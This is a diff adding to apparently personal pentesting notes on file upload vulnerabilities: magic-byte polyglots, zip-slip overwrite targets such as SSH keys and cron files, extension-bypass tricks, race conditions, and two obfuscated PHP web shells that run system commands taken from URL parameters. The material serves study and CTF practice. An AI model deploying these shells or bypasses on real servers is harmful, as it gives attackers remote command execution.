@@ -61,6 +61,7 @@ In the case of an image upload function, the server might try to verify certain 
 
 It is possible to inject magic-bytes into plain text files in order to make them look like other extension:
 
+*JPEG*
 ```bash
 ┌──(kali㉿kali)-[~/Pictures]
 └─$ echo -n "\xff\xd8\xff\xe1\x00\x18\x45\x78\x69\x66\x00\x00" > jpeg_exif 
@@ -72,6 +73,12 @@ It is possible to inject magic-bytes into plain text files in order to make them
 ┌──(kali㉿kali)-[~/Pictures]
 └─$ file jpeg_exif                                                                          
 jpeg_exif: JPEG image data, Exif standard: []
+```
+
+*GIF*
+```php
+GIF8;
+<?php phpinfo(); ?>
 ```
 
 But it's also possible using special tools, such as ExifTool, to create a polyglot JPEG file containing malicious code within its metadata:
@@ -105,13 +112,28 @@ The webshell uploaded inside the files folder is interpreted and PHP code is exe
 
 Sometime it is possible to exploit the same issue even if only archive files are accepted on the server and their upload path is correctly check. When archives are unzipped, if they contain files having relative or full paths as names, they can possibly be stored outside from the intended path, resulting in a path traversal and eventually remote code execution.
 
-Refer to [Slippy](../../Play%20ground/CTFs/Slippy.md) and [Acnologia Portal](../../Play%20ground/CTFs/Acnologia%20Portal.md) to see some examples.
+>[!example] Examples
+>- [Slippy](../../Play%20ground/CTFs/Slippy.md) 
+>- [Acnologia Portal](../../Play%20ground/CTFs/Acnologia%20Portal.md) 
+
+Interesting file that we can try to create or overwrite exploiting the zip slip vulnerability are:
+- SSH keys in `~/.ssh/`
+- configuration files
+- `__init__.py` for [Python](../Dev,%20scripting%20&%20OS/Python.md) applications [^__init__]
+- Application source code
+- Cookies or secrets stored inside writable files [^flask_session]
+- Cron files
+- Specific application features that can be exploited or used as gadget [^openrefine-zip-slip]
+
+[^__init__]: [Slippy](../../Play%20ground/CTFs/Slippy.md)
+[^flask_session]: [Acnologia Portal](../../Play%20ground/CTFs/Acnologia%20Portal.md)
+[^openrefine-zip-slip]: [Stefan Schiller - Unzipping Dangers OpenRefine Zip Slip Vulnerability](../../Readwise/Articles/Stefan%20Schiller%20-%20Unzipping%20Dangers%20OpenRefine%20Zip%20Slip%20Vulnerability.md)
 
 ## File upload race condition
 
 Modern frameworks generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.
 
-That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.
+That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous [Race Conditions](Race%20Condition.md) that enable an attacker to completely bypass even the most robust validation.
 
 >[!example]
 >Some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.
@@ -120,7 +142,7 @@ These vulnerabilities are often extremely subtle, making them difficult to detec
 
 ### Race condition in URL-based file upload (SSRF)
 
-Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation. As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.
+Similar [Race Conditions](Race%20Condition.md) can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation. As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.
 
 If the file is loaded into a temporary directory with a randomized name, if the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced. To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.
 
@@ -149,6 +171,31 @@ If the file is loaded into a temporary directory with a randomized name, if the 
 - Add semicolons or URL-encoded null byte characters before the file extension: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
 - Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
 - Inception of vulnerable extensions: `exploit.p.phphp` becomes `exploit.php` if the server do not remove extensions recursively
+
+*obfuscated_shell1.php*
+```php
+<?
+// shell.php?0=system&1=ls
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+```
+
+*obfuscated_shell2.php*
+```php
+<?php
+// shell.php?_=system&__=ls
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+```
+
 
 ## Tools
 
